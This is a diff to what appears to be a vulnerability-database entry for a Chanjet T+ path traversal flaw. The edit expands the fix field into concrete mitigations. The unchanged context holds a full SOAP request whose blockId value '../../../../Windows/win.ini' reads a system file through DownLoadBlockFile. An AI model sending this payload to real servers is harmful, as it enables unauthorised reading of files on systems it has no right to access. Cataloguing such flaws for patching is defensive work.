@@ -6,7 +6,7 @@ version = ""
 detail = """POST /tplus/GLSyncService.asmx/DownLoadBlockFile HTTP/1.1 Host: target Content-Type: text/xml
 
 <soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><DownLoadBlockFile xmlns="http://tempuri.org/"><blockId>../../../../Windows/win.ini</blockId></DownLoadBlockFile></soap:Body></soap:Envelope>"""
-fix = "关注官方补丁"
+fix = "关注畅捷通 T+ 官方安全补丁发布；对 DownLoadBlockFile 的 blockId 参数进行路径规范化检查，拒绝包含 ../ 遍历序列的输入；限制 GLSyncService.asmx 接口仅允许内网访问；WAF 拦截路径遍历特征。"
 date = 20260501
 label = "nday"
 cve = "TVD-2026-10503"
